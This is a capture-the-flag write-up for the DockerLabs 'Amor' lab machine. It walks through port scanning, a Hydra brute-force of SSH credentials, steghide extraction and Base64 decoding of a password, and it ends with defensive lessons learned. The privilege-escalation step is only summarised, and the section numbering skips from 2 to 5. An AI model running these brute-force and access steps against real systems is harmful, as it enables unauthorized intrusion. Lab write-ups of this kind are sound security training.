# Amor - DockerLabs - Easy

## Summary
Amor is an easy Linux Docker container exposing SSH and a web server on
port 80. The web page leaks the username `carlota`. Hydra is used to brute-force
her SSH credentials. Once inside, a JPEG image on her Desktop contains a
steganographically hidden file with a Base64-encoded password, which belongs to
user `oscar`. Oscar has a misconfigured sudo rule allowing `/usr/bin/ruby`
without a password, leading to immediate root.

## Tools
- `nmap`
- `hydra`
- `ssh`
- `scp`
- `steghide`
- `base64`

---

## 1. Enumeration

### Port Scanning

```sh
nmap -sV -sC -p- 172.17.0.2
```

```
22/tcp open ssh
80/tcp open http Apache
```

### Web Enumeration

Navigating to `http://172.17.0.2`, the page leaks the username **carlota** in
its content. We note this for the next step.

---

## 2. Exploitation

### Brute-Forcing SSH (Hydra)

Using the username found on the web page:

```sh
hydra -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4
```

```
[22][ssh] host: 172.17.0.2   login: carlota   password: <password>
```

### SSH Access as Carlota

```sh
ssh carlota@172.17.0.2
```

### Finding the Hidden Image

We explore Carlota's home directory:

```sh
ls /home/carlota/Desktop/fotos/vacaciones/
# imagen.jpg
```

We transfer the image to our attacker machine for analysis:

```sh
# On attacker machine
scp carlota@172.17.0.2:/home/carlota/Desktop/fotos/vacaciones/imagen.jpg .
```

### Steganography — Extracting the Hidden File

```sh
steghide extract -sf imagen.jpg
# passphrase: (empty — just press Enter)
# wrote extracted data to "secret.txt"
```

```sh
cat secret.txt
# ZXNsYWNhc2FkZXBpbnlwb24=
```

### Decoding the Password

```sh
echo "ZXNsYWNhc2FkZXBpbnlwb24=" | base64 -d
# eslacasadepinypon
```

---

## 5. Lessons Learned

- **Never leak usernames in web page content** — even a name on a blank page
  is enough to start a brute-force attack.
- **Weak SSH passwords** are trivially cracked with rockyou.txt; always enforce
  key-based authentication and rate limiting.
- **Steganography as a hiding mechanism** is not security — tools like
  `steghide` and `stegseek` trivially extract hidden data, especially with no
  passphrase set.
- **Never encode credentials in Base64** — it is encoding, not encryption, and
  is instantly reversible.
- **`sudo NOPASSWD` on scripting interpreters** (ruby, python, perl) is an
  immediate root escalation — any such rule grants full system access.
